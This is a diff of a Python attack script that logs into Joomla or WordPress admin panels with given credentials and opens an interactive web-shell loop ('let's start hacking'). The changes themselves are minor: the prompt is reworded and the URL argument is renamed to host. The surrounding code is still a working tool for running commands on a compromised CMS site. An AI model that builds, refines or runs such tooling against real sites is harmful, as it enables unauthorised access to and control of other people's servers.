@@ -91,8 +91,9 @@ def put_exploit_joomla(url):
     
     if "HelloWorld" in response.content.decode('utf-8'):
         print("[+] Open input user, let's start hacking")
+        print("Enter a (web)shell command (type 'exit' to quit): ")
         while True:
-            user_cmd = input("Enter a (web)shell command (type 'exit' to quit): ")
+            user_cmd = input()
         
             if user_cmd.lower() == 'exit':
                 break
@@ -115,7 +116,7 @@ def main():
     # Options for WordPress & Joomla
     parser.add_argument('-u', '--username', dest='username', help='username')
     parser.add_argument('-p', '--password', dest='password', help='password')
-    parser.add_argument('-H', '--url', dest='url', help='CMS website URL')
+    parser.add_argument('-H', '--host', dest='host', help='CMS website HOST')
 
     args = parser.parse_args()
 
@@ -124,8 +125,8 @@ def main():
             print('[+] Mode: wordpress')
         elif args.mode == 'joomla':
             print('[+] Mode: joomla')
-            hidden_values = get_hidden_values(args.url)
-            post_login_joomla(args.username, args.password, args.url, hidden_values)
+            hidden_values = get_hidden_values(args.host)
+            post_login_joomla(args.username, args.password, args.host, hidden_values)
     else:
         print("No CMS mode specified. Please choose a CMS mode: wordpress or joomla.")
 
